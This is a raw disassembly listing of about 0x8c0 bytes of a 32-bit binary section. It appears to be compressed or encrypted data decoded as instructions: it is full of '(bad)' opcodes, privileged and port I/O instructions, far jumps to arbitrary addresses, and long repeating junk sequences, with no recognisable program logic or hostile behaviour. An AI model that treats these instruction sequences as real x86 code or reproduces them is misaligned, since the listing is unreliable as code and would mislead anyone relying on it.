  4178f3:	add    BYTE PTR es:[eax],al
	...
  417906:	add    BYTE PTR [eax],al
  417908:	das    
  417909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41790a:	jb     0x417948
  41790c:	xor    al,al
  41790e:	mov    ss,WORD PTR [esi+0x2f]
  417911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417912:	jb     0x417930
  417914:	sub    DWORD PTR [edx-0x6b73d7c8],ebp
  41791a:	inc    ebp
  41791b:	daa    
  41791c:	add    BYTE PTR [edi+ecx*2-0xa9942e5],dh
  417923:	daa    
  417924:	call   0xef8358d1
  417929:	mov    al,ds:0xd6f33420
  41792e:	xor    al,0x2a
  417930:	jmp    0x4af:0xde4a31af
  417937:	add    al,0xc2
  417939:	scas   eax,DWORD PTR es:[edi]
  41793a:	sbb    edx,DWORD PTR [edi-0x43]
  41793d:	scas   eax,DWORD PTR es:[edi]
  41793e:	adc    DWORD PTR [edi-0x4e],eax
  417941:	lahf   
  417942:	hlt    
  417943:	add    ecx,DWORD PTR [ecx+ebp*4+0x667d271b]
  41794a:	lds    esp,FWORD PTR [edi]
  41794c:	mov    eax,0x9854dfa8
  417951:	mov    cl,0x16
  417953:	xor    al,0xaf
  417955:	stos   BYTE PTR es:[edi],al
  417956:	mov    dl,0x37
  417958:	mov    eax,ds:0x6f28c0a6
  41795d:	xchg   esp,eax
  41795e:	fbld   TBYTE PTR [edx]
  417960:	push   0x7333c0a2
  417965:	gs icebp 
  417967:	loope  0x4179d8
  417969:	test   al,0xc3
  41796b:	add    eax,DWORD PTR [eax]
	...
  41797d:	add    BYTE PTR [eax],al
  41797f:	add    BYTE PTR [ebx-0x533af758],ch
  417985:	mov    bl,0x67
  417987:	mov    ch,0xb2
  417989:	pop    ecx
  41798a:	lea    dx,[esi-0x596aa056]
  417991:	mov    ecx,0xb5718064
  417996:	pop    ecx
  417997:	xor    BYTE PTR [ebx-0x6c],0x49
  41799b:	xchg   ecx,eax
  41799c:	push   0xffffffb3
  41799e:	popa   
  41799f:	xchg   ebp,eax
  4179a0:	ins    BYTE PTR es:[edi],dx
  4179a1:	stos   DWORD PTR es:[edi],eax
  4179a2:	imul   eax,DWORD PTR [edi-0x749c4a9e],0x72
  4179a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179aa:	jns    0x4179fd
  4179ac:	ja     0x417952
  4179ae:	or     BYTE PTR [edi],ah
  4179b0:	ret    0x6bb3
  4179b3:	cmp    ah,BYTE PTR [edi-0x3dd5f750]
  4179b9:	mov    bl,0x6c
  4179bb:	sub    al,0xae
  4179bd:	mov    ds:0xb7a24463,eax
  4179c2:	jl     0x417a10
  4179c4:	iret   
  4179c5:	xchg   esp,eax
  4179c6:	dec    ecx
  4179c7:	cmp    esi,DWORD PTR [ebx-0x54e4b150]
  4179cd:	mov    bl,0x8
  4179cf:	sub    al,BYTE PTR [edx-0x2ae28761]
  4179d5:	mov    bl,0x7c
  4179d7:	xor    al,0x81
  4179d9:	mov    bl,0x7a
  4179db:	xor    ch,BYTE PTR [ebx-0x61]
  4179de:	or     BYTE PTR [edx],ch
  4179e0:	bound  ebx,QWORD PTR [edi+0xfd78]
	...
  4179f6:	add    BYTE PTR [eax],al
  4179f8:	retf   0x789c
  4179fb:	(bad)  
  4179fc:	popa   
  4179fd:	mov    al,ds:0x9466cc41
  417a02:	dec    ecx
  417a03:	(bad)  [esi-0x5552835c]
  417a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a0a:	jl     0x4179e7
  417a0c:	lods   al,BYTE PTR ds:[esi]
  417a0d:	lahf   
  417a0e:	inc    ecx
  417a0f:	add    al,al
  417a11:	push   0x8
  417a13:	inc    ebx
  417a14:	daa    
  417a15:	imul   edi,DWORD PTR [eax+0x74],0x7
  417a19:	outs   dx,DWORD PTR ds:[esi]
  417a1a:	fs les esp,FWORD PTR gs:[eax+0x69]
  417a1f:	inc    ebx
  417a20:	cli    
  417a21:	jne    0x417a9f
  417a23:	gs in  eax,dx
  417a25:	pop    edi
  417a26:	or     BYTE PTR [edx+0x10],dl
  417a29:	pop    esi
  417a2a:	imul   esi,DWORD PTR [edx+0x21],0x5363c0
  417a31:	js     0x417aa1
  417a33:	add    dl,bh
  417a35:	arpl   WORD PTR [ecx+0x6e],bp
  417a38:	add    eax,0x10636362
  417a3d:	popa   
  417a3e:	ja     0x417a94
  417a40:	cmp    bh,BYTE PTR [ebx+0x69]
  417a43:	outs   dx,BYTE PTR ds:[esi]
  417a44:	jne    0x417a9e
  417a46:	popa   
  417a47:	jo     0x417a19
  417a49:	bound  esi,QWORD PTR [edi+0x6f]
  417a4c:	mov    ebx,0xb9657c71
  417a51:	ja     0x417abe
  417a53:	shr    BYTE PTR [si+0x43],1
  417a57:	outs   dx,BYTE PTR ds:[esi]
  417a58:	and    BYTE PTR [ebx+0x69],0x72
	...
  417a70:	gs into 
  417a72:	imul   esi,DWORD PTR [ecx+edx*4+0x77],0x599b655f
  417a7a:	data16 data16 mov ah,BYTE PTR [edx+0x61]
  417a7f:	popa   
  417a80:	mov    eax,ds:0x256e6379
  417a85:	shl    BYTE PTR [ebx+0x6e],cl
  417a88:	and    ebp,DWORD PTR [edx+edi*2+0x74]
  417a8c:	xchg   BYTE PTR [ecx+0x6c],bh
  417a8f:	push   esp
  417a90:	sbb    al,dl
  417a92:	jl     0x417b06
  417a94:	cmp    al,0x79
  417a96:	imul   edx,DWORD PTR [ebx-0x24],0x6e
  417a9a:	xor    eax,0x15f18c00
  417a9f:	gs imul edx,edi,0x4f
  417aa3:	jno    0x417b0e
  417aa5:	fisttp DWORD PTR [ebx+0x0]
  417aa8:	pop    eax
  417aa9:	inc    esi
  417aaa:	push   ss
  417aab:	imul   ebx,DWORD PTR [ecx-0x23],0xdf657258
  417ab2:	adc    ebp,DWORD PTR [ecx+ebp*2+0x6]
  417ab6:	and    BYTE PTR [esi+0x2d],dl
  417ab9:	or     DWORD PTR [eax],esi
  417abb:	arpl   WORD PTR [ebp+0x2d],cx
  417abe:	dec    esp
  417abf:	fs add BYTE PTR es:[edx],bh
  417ac3:	je     0x417b1d
  417ac5:	(bad)  
  417ac6:	adc    DWORD PTR [ebx+0x3a],esp
  417ac9:	std    
  417aca:	sbb    dl,BYTE PTR ss:[si]
  417ace:	adc    eax,0x3a103363
	...
  417ae7:	add    BYTE PTR [edx+ecx*8-0x400388c6],cl
  417aee:	stc    
  417aef:	xor    DWORD PTR [edx-0x7393d739],esi
  417af5:	push   0x3a
  417af7:	ja     0x417af5
  417af9:	push   edi
  417afa:	dec    edi
  417afb:	outs   dx,BYTE PTR ds:[esi]
  417afc:	fcomp  QWORD PTR [ecx+0x15]
  417aff:	je     0x417aea
  417b01:	retf   0x4430
  417b04:	in     eax,dx
  417b05:	pop    edi
  417b06:	sub    eax,DWORD PTR [eax]
  417b08:	iret   
  417b09:	mov    BYTE PTR [edx],bh
  417b0b:	je     0x417ae8
  417b0d:	jnp    0x417b2e
  417b0f:	outs   dx,BYTE PTR ds:[esi]
  417b10:	fild   WORD PTR [ecx+edi*1+0x5a18b174]
  417b17:	je     0x417abc
  417b19:	sbb    DWORD PTR [eax],esp
  417b1b:	aas    
  417b1c:	mov    WORD PTR [edx+0x1f],gs
  417b1f:	jb     0x417ab9
  417b21:	push   0x6aa97316
  417b26:	pop    ds
  417b27:	jb     0x417ac1
  417b29:	xchg   esp,eax
  417b2a:	fsub   DWORD PTR ds:0x37c0b173
  417b30:	outs   dx,DWORD PTR ds:[esi]
  417b31:	mov    eax,ds:0xa05d1da8
  417b36:	mov    dh,0x31
  417b38:	outs   dx,DWORD PTR ds:[esi]
  417b39:	xchg   esp,eax
  417b3a:	mov    ds:0xa2a05e28,al
  417b3f:	pop    ds
  417b40:	jno    0x417ae3
  417b42:	les    edx,FWORD PTR [edx+0x60]
  417b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b46:	mov    cl,0x28
  417b48:	mov    ecx,ss
  417b4a:	xchg   ecx,eax
  417b4b:	sub    al,0x0
	...
  417b5d:	add    BYTE PTR [eax],al
  417b5f:	add    BYTE PTR [eax+eiz*4],bh
  417b62:	mov    al,ds:0x889f3322
  417b67:	xor    DWORD PTR [edi],ebp
  417b69:	ror    DWORD PTR [ecx+esi*1+0x1c85ab38],1
  417b70:	sub    eax,0x3c287bb3
  417b75:	mov    ds:0xa03b3588,al
  417b7a:	mov    WORD PTR [edx],?
  417b7c:	das    
  417b7d:	fild   WORD PTR [ebx]
  417b80:	mul    DWORD PTR [ecx-0x571021a8]
  417b86:	dec    ebx
  417b87:	add    al,0xc7
  417b89:	mov    eax,ds:0xa0ef4548
  417b8e:	and    bl,BYTE PTR ds:0x1e46a4f7
  417b94:	out    dx,eax
  417b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b96:	xor    edx,DWORD PTR [ebx+edi*4-0x60]
  417b9a:	inc    edi
  417b9b:	inc    ebx
  417b9c:	mov    WORD PTR [edi+ecx*1+0x11a5c031],ss
  417ba3:	daa    
  417ba4:	lods   eax,DWORD PTR ds:[esi]
  417ba5:	add    sp,WORD PTR [eax]
  417ba8:	test   al,0x94
  417baa:	das    
  417bab:	push   ecx
  417bac:	mov    eax,0xcd26f1a5
  417bb1:	mov    ds:0xaf98230c,al
  417bb6:	or     BYTE PTR [eax],ah
  417bb8:	jp     0x417b5d
  417bba:	jl     0x417bc4
  417bbc:	jb     0x417b71
  417bbe:	imul   ebp,ecx,0xffffff8f
  417bc1:	xchg   esp,eax
  417bc2:	or     cl,ch
	...
  417bd8:	(bad)  
  417bd9:	xchg   esp,eax
  417bda:	or     cl,ch
  417bdc:	(bad)  
  417bdd:	xchg   esp,eax
  417bde:	or     cl,ch
  417be0:	(bad)  
  417be1:	xchg   esp,eax
  417be2:	or     cl,ch
  417be4:	(bad)  
  417be5:	xchg   esp,eax
  417be6:	or     cl,ch
  417be8:	(bad)  
  417be9:	xchg   esp,eax
  417bea:	or     cl,ch
  417bec:	(bad)  
  417bed:	xchg   esp,eax
  417bee:	or     cl,ch
  417bf0:	(bad)  
  417bf1:	xchg   esp,eax
  417bf2:	or     cl,ch
  417bf4:	(bad)  
  417bf5:	xchg   esp,eax
  417bf6:	or     cl,ch
  417bf8:	(bad)  
  417bf9:	xchg   esp,eax
  417bfa:	or     cl,ch
  417bfc:	(bad)  
  417bfd:	xchg   esp,eax
  417bfe:	or     cl,ch
  417c00:	(bad)  
  417c01:	xchg   esp,eax
  417c02:	or     cl,ch
  417c04:	(bad)  
  417c05:	xchg   esp,eax
  417c06:	or     cl,ch
  417c08:	(bad)  
  417c09:	xchg   esp,eax
  417c0a:	or     cl,ch
  417c0c:	(bad)  
  417c0d:	xchg   esp,eax
  417c0e:	or     cl,ch
  417c10:	(bad)  
  417c11:	xchg   esp,eax
  417c12:	or     cl,ch
  417c14:	(bad)  
  417c15:	xchg   esp,eax
  417c16:	or     cl,ch
  417c18:	(bad)  
  417c19:	xchg   esp,eax
  417c1a:	or     cl,ch
  417c1c:	(bad)  
  417c1d:	xchg   esp,eax
  417c1e:	or     cl,ch
  417c20:	(bad)  
  417c21:	xchg   esp,eax
  417c22:	or     cl,ch
  417c24:	(bad)  
  417c25:	xchg   esp,eax
  417c26:	or     cl,ch
  417c28:	(bad)  
  417c29:	xchg   esp,eax
  417c2a:	or     cl,ch
  417c2c:	(bad)  
  417c2d:	xchg   esp,eax
  417c2e:	or     cl,ch
  417c30:	(bad)  
  417c31:	xchg   esp,eax
  417c32:	or     cl,ch
  417c34:	(bad)  
  417c35:	xchg   esp,eax
  417c36:	or     cl,ch
  417c38:	(bad)  
  417c39:	xchg   esp,eax
  417c3a:	or     cl,ch
	...
  417c50:	(bad)  
  417c51:	xchg   esp,eax
  417c52:	or     cl,ch
  417c54:	(bad)  
  417c55:	xchg   esp,eax
  417c56:	or     BYTE PTR [eax],al
  417c58:	xor    eax,0x35000898
  417c5d:	cwde   
  417c5e:	ja     0x417cc8
  417c60:	mov    BYTE PTR [esp+eiz*2+0x68f1d733],dh
  417c67:	ins    BYTE PTR es:[edi],dx
  417c68:	loope  0x417c01
  417c6a:	push   edi
  417c6b:	dec    eax
  417c6c:	sub    bh,BYTE PTR [ebx-0x4c2db984]
  417c72:	ins    BYTE PTR es:[edi],dx
  417c73:	xlat   BYTE PTR gs:[ebx]
  417c75:	addr16 push ebp
  417c77:	je     0x417c36
  417c79:	push   esi
  417c7a:	or     BYTE PTR [eax],al
  417c7c:	cmc    
  417c7d:	xchg   edi,eax
  417c7e:	or     BYTE PTR [eax],al
  417c80:	lea    edx,[ebp+esi*1+0x0]
  417c84:	loopne 0x417c59
  417c86:	xor    eax,0x35d40000
  417c8b:	add    BYTE PTR [esi],dl
  417c8d:	aam    0x35
  417c8f:	add    BYTE PTR [esp+edx*8],dl
  417c92:	xor    eax,0x35d32400
  417c97:	add    BYTE PTR [ebx+edx*8+0x35],al
  417c9b:	add    BYTE PTR [ebx-0x2d],cl
  417c9e:	xor    eax,0x35d36000
  417ca3:	add    BYTE PTR [ebx+edx*8+0x35],dh
  417ca7:	add    BYTE PTR [edi-0x34],bl
  417caa:	xor    eax,0x35cc7300
  417caf:	add    BYTE PTR [esi+0x35cd],cl
	...
  417cc5:	add    BYTE PTR [eax],al
  417cc7:	add    BYTE PTR [ebp-0x69],ah
  417cca:	or     BYTE PTR [eax],al
  417ccc:	je     0x417c65
  417cce:	or     BYTE PTR [eax+0x89768],al
  417cd4:	mov    al,0xc1
  417cd6:	sub    BYTE PTR [edx+edx*4-0x45],al
  417cda:	jns    0x417d49
  417cdc:	cwde   
  417cdd:	scas   al,BYTE PTR es:[edi]
  417cde:	jl     0x417d53
  417ce0:	xor    eax,0x8c000898
  417ce5:	jge    0x417ced
  417ce7:	add    BYTE PTR [ebp+edi*8-0x3e638fb5],cl
  417cee:	sub    esi,DWORD PTR [ebp+ebp*4-0x3]
  417cf2:	or     eax,DWORD PTR [eax]
  417cf4:	mov    WORD PTR [ebp+0x0],?
  417cf7:	add    BYTE PTR [ebp+edi*8-0x239092c4],cl
  417cfe:	sbb    al,0x20
  417d00:	dec    ebp
  417d01:	in     eax,dx
  417d02:	cmp    BYTE PTR [ebp+ebp*2-0xf],al
  417d06:	sub    eax,DWORD PTR [eax]
  417d08:	(bad)  
  417d09:	std    
  417d0a:	or     BYTE PTR [eax+0x8fdac],al
  417d10:	dec    edi
  417d11:	fsubr  QWORD PTR ds:0xbfd7168
  417d17:	add    BYTE PTR [ebp+edi*2-0x3340015],cl
  417d1e:	dec    ebp
  417d1f:	ins    DWORD PTR es:[edi],dx
  417d20:	xor    esp,DWORD PTR [esi]
  417d22:	adc    al,0x63
  417d24:	aas    
  417d25:	std    
  417d26:	or     eax,DWORD PTR [eax]
  417d28:	mov    WORD PTR [ebp-0x12],?
  417d2b:	inc    DWORD PTR [eax]
	...
  417d3d:	add    BYTE PTR [eax],al
  417d3f:	add    BYTE PTR [ebx+0x1f6730fc],ch
  417d45:	mov    DWORD PTR [edx],edx
  417d47:	jb     0x417d5e
  417d49:	std    
  417d4a:	or     al,BYTE PTR [eax]
  417d4c:	mov    WORD PTR [ebp+0x7],?
  417d4f:	add    BYTE PTR [ebx+edi*8-0x485388d1],cl
  417d56:	adc    DWORD PTR [ecx+0x1],esp
  417d59:	pop    ecx
  417d5a:	daa    
  417d5b:	outs   dx,BYTE PTR ds:[esi]
  417d5c:	clc    
  417d5d:	outs   dx,BYTE PTR ds:[esi]
  417d5e:	or     al,0x2
  417d60:	mov    ebx,?
  417d62:	mov    BYTE PTR [ecx],ah
  417d64:	mov    ebx,?
  417d66:	or     BYTE PTR [ecx-0x15],al
  417d69:	pop    eax
  417d6a:	(bad)  
  417d6c:	loop   0x417d09
  417d6e:	dec    ebx
  417d6f:	jo     0x417d2d
  417d71:	xchg   esp,eax
  417d72:	and    esp,DWORD PTR ds:0x4df73b8
  417d78:	mov    WORD PTR [edi+ebx*2-0x20edcc1e],ss
  417d7f:	cmp    BYTE PTR [ebx-0x52e2f04c],ah
  417d85:	mov    ah,bh
  417d87:	xor    eax,0x5df85af
  417d8c:	mov    WORD PTR [edi+ebx*2-0x20edf427],ss
  417d93:	inc    esi
  417d94:	jno    0x417e15
  417d96:	les    ebx,FWORD PTR [edx]
  417d98:	push   0xffffffb4
  417d9a:	mov    ds:0xb4876d1a,eax
  417d9f:	and    BYTE PTR [edx-0x78],bh
  417da2:	mov    dl,0x3
	...
  417db8:	mov    ss,WORD PTR [edi+ebx*8-0x206b567d]
  417dbf:	add    ecx,DWORD PTR [ebp-0x7f]
  417dc2:	mov    ah,0x18
  417dc4:	cmp    DWORD PTR [edx+0x7f2844bf],eax
  417dca:	cwde   
  417dcb:	sbb    DWORD PTR [ebx],esi
  417dcd:	test   DWORD PTR [ebx-0x7777accb],edx
  417dd3:	xor    DWORD PTR [edi],ebp
  417dd5:	mov    ah,0x93
  417dd7:	sbb    dh,BYTE PTR [ecx]
  417dd9:	xor    BYTE PTR [edx+0x3],0x9b
  417ddd:	adc    edi,ebx
  417ddf:	sbb    DWORD PTR [esp+edx*4-0x21],0x3
  417de4:	retf   
  417de5:	js     0x417e43
  417de7:	sbb    esi,edx
  417de9:	jnp    0x417e3d
  417deb:	xor    dh,bh
  417ded:	jae    0x417e42
  417def:	sbb    edi,edx
  417df1:	ja     0x417df2
  417df3:	dec    edi
  417df4:	stc    
  417df5:	sbb    DWORD PTR [ebx+0x35],0x3df938c
  417dfc:	or     al,0x97
  417dfe:	or     cl,ch
  417e00:	(bad)  
  417e01:	xchg   esp,eax
  417e02:	pop    eax
  417e03:	inc    esp
  417e04:	add    BYTE PTR [ebx-0x7f90e89b],0x8
  417e0b:	cmp    dl,BYTE PTR [ebp+0x6f1e7c7a]
  417e11:	xchg   BYTE PTR [ebx+0x2d],ch
  417e14:	arpl   WORD PTR [ecx+0x69],di
  417e17:	sti    
  417e18:	test   BYTE PTR [ebx+0x765],al
	...
  417e2e:	add    BYTE PTR [eax],al
  417e30:	pop    esp
  417e31:	jo     0x417e90
  417e33:	add    BYTE PTR [esi+0x78],dh
  417e36:	gs test al,0x70
  417e3a:	dec    ecx
  417e3b:	fdivr  QWORD PTR [ecx-0x5430947a]
  417e41:	push   0x6b
  417e43:	fstp   TBYTE PTR [eax+0x53bf6579]
  417e49:	push   ebp
  417e4a:	jo     0x417e05
  417e4c:	jnp    0x417ecd
  417e4e:	jp     0x417e14
  417e50:	mov    eax,ds:0x72c15970
  417e55:	and    BYTE PTR [ecx+ecx*1+0x4e],0x7f
  417e5a:	lea    esp,fs:[edx-0x6516867a]
  417e61:	mov    WORD PTR [eax-0x7b],?
  417e64:	xchg   esp,eax
  417e65:	xchg   BYTE PTR [ebx-0x65],ch
  417e68:	lds    esi,FWORD PTR [ebp+0x70]
  417e6b:	mov    WORD PTR [edi-0x3d47dc9d],cs
  417e71:	lds    esp,FWORD PTR [ebx]
  417e73:	mov    eax,0xe9f510a7
  417e78:	(bad)  
  417e79:	xchg   esp,eax
  417e7a:	pop    ecx
  417e7b:	dec    esp
  417e7c:	(bad)  
  417e7d:	jnp    0x417ef7
  417e7f:	inc    esp
  417e80:	ret    0x6585
  417e83:	inc    edi
  417e84:	scas   eax,DWORD PTR es:[edi]
  417e85:	mov    BYTE PTR [ebx+0x39],ch
  417e88:	mov    ds:0xbc007e77,al
  417e8d:	lods   al,BYTE PTR ds:[esi]
  417e8e:	imul   esp,DWORD PTR [edi-0x30],0x655798
	...
  417ea5:	add    BYTE PTR [eax],al
  417ea7:	add    BYTE PTR [ecx-0x47],dh
  417eaa:	push   0x50
  417eac:	xchg   DWORD PTR [ebx-0x50669682],ebp
  417eb2:	imul   esp,DWORD PTR [ebp+0x25],0x69
  417eb6:	imul   eax,DWORD PTR [ebx-0x73],0x906766b3
  417ebd:	retf   0x7463
  417ec0:	jl     0x417e74
  417ec2:	jge    0x417f14
  417ec4:	pop    ss
  417ec5:	stos   DWORD PTR es:[edi],eax
  417ec6:	jle    0x417f31
  417ec8:	mov    DWORD PTR [edi+0x68f5656b],ebp
  417ece:	imul   eax,DWORD PTR [ebx-0x19],0xd07455ae
  417ed5:	pop    edi
  417ed6:	arpl   WORD PTR [ebx-0x40],bp
  417ed9:	lods   eax,DWORD PTR ds:[esi]
  417eda:	pop    eax
  417edb:	jb     0x417ea9
  417edd:	lds    ebp,FWORD PTR [ebp+0x6c]
  417ee0:	shl    BYTE PTR [ecx+ebp*2+0x4aaef600],1
  417ee7:	popa   
  417ee8:	(bad)  
  417ee9:	mov    al,0x79
  417eeb:	jo     0x417f12
  417eed:	retf   0x766d
  417ef0:	sbb    al,0xa8
  417ef2:	imul   esp,DWORD PTR [edi+0x10],0xf7655794
  417ef9:	scas   al,BYTE PTR es:[edi]
  417efa:	ja     0x417f70
  417efc:	sub    cl,cl
  417efe:	imul   edx,DWORD PTR [eax+0x27],0x9697eaa
  417f05:	scas   eax,DWORD PTR es:[edi]
  417f06:	imul   esp,DWORD PTR [ebp-0x5b],0x68
  417f0a:	imul   ecx,DWORD PTR [ecx+0x0],0x0
	...
  417f1d:	add    BYTE PTR [eax],al
  417f1f:	add    BYTE PTR [ebx],cl
  417f21:	mov    ecx,0xc3d4657a
  417f26:	imul   edx,DWORD PTR [ecx-0x20],0x8c617ca7
  417f2d:	int    0x3a
  417f2f:	addr16 loop 0x417f86
  417f32:	adc    BYTE PTR [ebx-0x15],ah
  417f35:	pusha  
  417f36:	or     al,0x51
  417f38:	icebp  
  417f39:	mov    esp,0x5ee57139
  417f3e:	push   ds
  417f3f:	push   eax
  417f40:	mov    esi,0xbe5f0f54
  417f45:	mov    ah,0x58
  417f47:	ins    DWORD PTR es:[edi],dx
  417f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f49:	cwde   
  417f4a:	push   ds
  417f4b:	push   eax
  417f4c:	mov    esi,0xb8672694
  417f51:	cwde   
  417f52:	adc    eax,0x58fd8c63
  417f57:	dec    ebp
  417f58:	mov    edi,0x9f22eca9
  417f5d:	fnsave [eax]
  417f5f:	push   esp
  417f60:	pusha  
  417f61:	lods   eax,DWORD PTR ds:[esi]
  417f62:	(bad)  [esi]
  417f64:	mov    dl,0xad
  417f66:	out    dx,eax
  417f67:	or     DWORD PTR [esi+ebx*8+0x39],eax
  417f6b:	je     0x417f23
  417f6d:	popf   
  417f6e:	out    0x70,eax
  417f70:	cdq    
  417f71:	repz dec ebx
  417f73:	popa   
  417f74:	outs   dx,DWORD PTR ds:[esi]
  417f75:	loopne 0x417faf
  417f77:	je     0x417f0f
  417f79:	popf   
  417f7a:	shr    BYTE PTR [esi+eiz*4],cl
  417f7d:	clc    
  417f7e:	out    dx,al
  417f7f:	ds das 
  417f81:	fisub  DWORD PTR [edi]
  417f83:	jo     0x417f85
	...
  417f95:	add    BYTE PTR [eax],al
  417f97:	add    BYTE PTR [eax],bh
  417f99:	call   0x1e70ede5
  417f9e:	adc    eax,0xdf1e2267
  417fa3:	pop    ds
  417fa4:	xor    eax,0x186e2819
  417fa9:	and    al,0x25
  417fab:	ja     0x418015
  417fad:	(bad)  
  417faf:	cmp    BYTE PTR ds:0x960af948,bl
  417fb5:	cmp    bl,BYTE PTR [esi]
  417fb7:	outs   dx,BYTE PTR ds:[esi]
  417fb8:	clc    
  417fb9:	xchg   esp,eax
  417fba:	inc    esp
  417fbb:	push   ss
  417fbc:	add    al,al
  417fbe:	and    esp,DWORD PTR [ecx]
  417fc0:	loop   0x418037
  417fc2:	push   ebx
  417fc3:	sbb    al,0xa6
  417fc5:	mov    ah,0xc
  417fc7:	sbb    bh,bl
  417fc9:	lahf   
  417fca:	stc    
  417fcb:	inc    edx
  417fcc:	jmp    0xed62c54f
  417fd1:	mov    BYTE PTR [eax+0x17],cl
  417fd4:	mov    edx,0xb022ffca
  417fd9:	jge    0x417fed
  417fdb:	and    DWORD PTR [edi-0x5de8dd66],eax
  417fe1:	mov    BYTE PTR [esi+edx*1],al
  417fe4:	mov    al,ds:0x9c2d3bbf
  417fe9:	ja     0x417fb4
  417feb:	jecxz  0x417fa7
  417fed:	test   bh,ch
  417fef:	pop    ss
  417ff0:	stos   DWORD PTR es:[edi],eax
  417ff1:	jno    0x417ff3
  417ff3:	xor    BYTE PTR [ebx+0x7d],dh
  417ff6:	cmc    
  417ff7:	(bad)  
  417ff8:	jo     0x41806b
  417ffa:	shl    DWORD PTR [eax],cl
	...
  418010:	cmp    BYTE PTR [edi+0x777e2fd2],0xc0
  418017:	sbb    BYTE PTR [edi+0x7216a29a],dl
  41801d:	mov    ah,al
  41801f:	adc    eax,0x15acbf60
  418024:	ins    DWORD PTR es:[edi],dx
  418025:	jge    0x417fea
  418027:	sbb    al,0x3a
  418029:	jne    0x418024
  41802b:	jecxz  0x41805a
  41802d:	jnp    0x417fcc
  41802f:	and    al,0x3e
  418031:	mov    esp,esp
  418033:	stc    
  418034:	pop    esi
  418035:	add    DWORD PTR [ecx+esi*1+0x208e5377],0xe3c98832
  418040:	inc    esi
  418041:	jge    0x417fcc
  418043:	sbb    al,0x20
  418045:	or     BYTE PTR [eax],0x88
  418048:	(bad)
  41804d:	mov    ch,0x69
  41804f:	push   esi
  418050:	mov    ds:0x97556784,eax
  418055:	jb     0x4180bb
  418057:	dec    esp
  418058:	jne    0x418007
  41805a:	inc    ebx
  41805b:	cmp    ah,BYTE PTR [edi+0x41fc2851]
  418061:	mov    ebp,0x75c10931
  418066:	dec    bp
  418068:	mov    eax,ds:0x37097987
  41806d:	lds    ebx,FWORD PTR [edi]
  41806f:	hlt    
  418070:	xor    eax,0xe9029a
	...
  418085:	add    BYTE PTR [eax],al
  418087:	add    ah,cl
  418089:	jg     0x4180f1
  41808b:	sbb    eax,0xbc7c7e8b
  418090:	pop    ebx
  418091:	jno    0x4180f9
  418093:	push   cs
  418094:	pop    esp
  418095:	jl     0x4180c9
  418097:	jmp    0x8aafff7
  41809c:	mov    esp,0xf5ff6575
  4180a1:	or     al,0x4e
  4180a3:	lods   al,BYTE PTR ds:[esi]
  4180a4:	dec    ebx
  4180a5:	mov    ah,0x2b
  4180a7:	(bad)  
  4180a9:	push   esp
  4180aa:	pop    esp
  4180ab:	mov    ebp,0xff37bf3f
  4180b0:	fistp  WORD PTR [ecx-0x7c7f4efe]
  4180b6:	jl     0x4180bb
  4180b8:	call   0xc625fa6e
  4180bd:	int    0x69
  4180bf:	retf   0x84a2
  4180c2:	jl     0x4180a7
  4180c4:	scas   eax,DWORD PTR es:[edi]
  4180c5:	mov    edx,0x9abad325
  4180ca:	inc    edi
  4180cb:	mov    ch,BYTE PTR [ecx+esi*2+0x78]
  4180cf:	xchg   ebp,eax
  4180d0:	mov    edx,0x6006651
  4180d5:	test   al,0x6c
  4180d7:	imul   eax,DWORD PTR [ebx],0xc2032b0
  4180dd:	lods   al,BYTE PTR ds:[esi]
  4180de:	imul   ebp,DWORD PTR [esi-0x7],0xa1797cae
  4180e5:	lock push ds
  4180e7:	cmp    edx,esp
  4180e9:	repz and al,0xd
	...
  418100:	outs   dx,DWORD PTR ds:[esi]
  418101:	push   ebp
  418102:	arpl   WORD PTR [esi-0x5d],bp
  418105:	stos   DWORD PTR es:[edi],eax
  418106:	addr16 je 0x4180c5
  418109:	mov    eax,ds:0xb5853a66
  41810e:	outs   dx,DWORD PTR fs:[esi]
  418110:	xchg   BYTE PTR [ebx-0x3a67f5ff],ch
  418116:	imul   esi,DWORD PTR [edx+0x60],0x83656b57
  41811d:	les    esi,FWORD PTR [edx]
  41811f:	and    BYTE PTR [eax-0x5f],dh
  418122:	jb     0x41818d
  418124:	and    DWORD PTR [ebp+edx*2+0x24e1d92f],esp
  41812b:	and    BYTE PTR ds:0x56d63b5,bh
  418131:	mov    bh,0x7c
  418133:	imul   edx,DWORD PTR [edi-0x7ac49654],0x284957c3
  41813d:	clc    
  41813e:	cmp    DWORD PTR [esi],ebp
  418140:	test   ebp,edi
  418142:	adc    al,0x57
  418144:	int3   
  418145:	mov    eax,ds:0xc51a6f6c
  41814a:	sub    BYTE PTR [ecx],bh
  41814c:	(bad)  
  41814d:	out    dx,eax
  41814e:	add    DWORD PTR [edx],ecx
  418150:	mov    al,0xd
  418152:	cmc    
  418153:	sub    eax,0x22e1b5
  418158:	shr    ebp,1
  41815a:	and    ch,BYTE PTR [edx]
  41815c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41815d:	in     eax,dx
  41815e:	and    ch,BYTE PTR [edx]
  418160:	mov    ebp,?
  418162:	xor    BYTE PTR [ebp+0x0],dl
	...
  418175:	add    BYTE PTR [eax],al
  418177:	add    BYTE PTR [ebp+0x31],dl
  41817a:	or     DWORD PTR [ecx+0x71],edi
  41817d:	dec    ebp
  41817e:	loope  0x4181d7
  418180:	popa   
  418181:	sar    al,1
  418183:	xor    esp,esp
  418185:	rcl    ch,1
  418187:	das    
  418188:	mov    eax,0xbc22de25
  41818d:	scas   eax,DWORD PTR es:[edi]
  41818e:	xor    al,0x23
  418190:	mov    esp,0xb12b34af
  418195:	lods   eax,DWORD PTR ds:[esi]
  418196:	ficom  WORD PTR [edi-0x57]
  418199:	lods   eax,DWORD PTR ds:[esi]
  41819a:	ficom  WORD PTR [edi-0x4f]
  41819d:	or     eax,0xda957db
  4181a2:	fist   DWORD PTR [edi+0x71]
  4181a5:	or     eax,0xd6957db
  4181aa:	fist   DWORD PTR [edi-0x47]
  4181ad:	std    
  4181ae:	inc    ecx
  4181af:	arpl   WORD PTR [eax-0x4a8bd445],di
  4181b5:	stos   DWORD PTR es:[edi],eax
  4181b6:	pop    ds
  4181b7:	push   ecx
